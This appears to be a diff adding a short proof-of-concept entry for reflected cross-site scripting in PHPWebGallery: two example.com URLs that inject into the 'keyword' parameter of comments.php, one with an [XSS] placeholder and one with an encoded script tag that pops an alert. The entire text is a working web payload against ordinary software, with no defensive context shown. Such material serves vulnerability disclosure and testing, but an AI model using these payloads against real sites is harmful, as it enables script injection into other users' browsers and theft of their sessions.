@@ -1,0 +1,4 @@
+http://www.example.com/phpwebgallery/comments.php?keyword=%22%3E[XSS]
+
+http://www.example.com/phpwebgallery/comments.php?keyword=%22%3E%3Cscript%3Ealert('Hi+Master');%3C/script%3E
+
